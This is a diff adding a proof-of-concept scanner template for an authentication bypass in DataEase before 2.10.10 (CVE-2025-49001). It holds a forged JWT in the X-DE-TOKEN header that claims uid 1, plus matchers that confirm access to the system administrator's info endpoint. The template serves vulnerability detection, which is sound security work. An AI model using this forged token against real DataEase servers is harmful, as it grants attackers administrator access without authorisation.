@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "DataEase 2.10.10 之前版本 CommunityTokenFilter 的 JWT 校验逻辑存在缺陷，HMAC 签名校验抛出异常后未中断请求流程，攻击者可伪造任意 JWT 令牌（uid=1,oid=1）绕过身份认证，以管理员身份访问系统接口。发送带伪造 X-DE-TOKEN 头部的 GET 请求到 /de2api/user/info 接口，若返回 uid=1 的管理员信息则证实存在漏洞。"
+id = "POC-AVE-2025-0028"
+name = "DataEase JWT Authentication Bypass PoC"
+severity = "critical"
+tags = ["ave-2025-0028"]
+vuln_id = [
+    "CVE-2025-49001",
+    "AVE-2025-0028",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/de2api/user/info"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+X-DE-TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8"
+out_auth_platform = "default"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    '"id":"1"',
+    '"name":"系统管理员"',
+]
